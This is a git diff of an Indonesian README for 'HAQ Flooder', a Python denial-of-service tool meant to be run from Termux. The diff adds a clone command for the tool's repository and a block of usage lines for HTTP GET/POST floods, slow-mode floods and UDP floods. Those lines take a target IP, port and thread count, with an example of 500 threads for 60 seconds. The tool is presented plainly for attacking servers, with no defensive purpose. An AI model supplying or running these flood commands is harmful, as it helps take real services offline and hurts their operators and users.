@@ -1,6 +1,8 @@
 # HAQ Flooder
 
-Ini adalah script Python untuk menjalankan serangan sederhana jenis **HTTP Flood** dan **UDP Flood** menggunakan Termux di perangk## Fitur
+Ini adalah script Python untuk menjalankan serangan sederhana jenis **HTTP Flood** dan **UDP Flood** 
+
+## Fitur
 
 *   **Dua Jenis Serangan:**
     *   **HTTP Flood:** Mengirim permintaan HTTP (GET atau POST) ke server web.
@@ -38,22 +40,18 @@ Ini adalah script Python untuk menjalankan serangan sederhana jenis **HTTP Flood
     pip install colorama
     ```
 5.  **Unduh Script:**
-    *   Jika Anda mengkloning repo GitHub: `git clone <URL_REPO_ANDA>`
-    *   Jika Anda membuat file secara manual: Salin kode Python ke dalam file bernama `termux_flood.py`.
-
----
-
-**Sintaks Dasar:**
-
+   
 ```bash
+git clone https://github.com/km2262488/HAQFLOODER.git
+cd HAQFLOODER
 python flood.py <TARGET_IP> <TARGET_PORT> <THREADS> <ATTACK_TYPE> [HTTP_METHOD]
 python flood.py <IP> <PORT> <THREADS_PER_PORT> http normal <DURATION> GET
 # Atau POST
 python flood.py <IP> <PORT> <THREADS_PER_PORT> http normal <DURATION> POST
 python flood.py 192.168.1.100 80 500 http normal 60 GET
-python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
 
-python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
-python termux_flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
+slow mode
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow <DURATION>
+
 slow POST mode
-python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow POST
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow <DURATION> POST
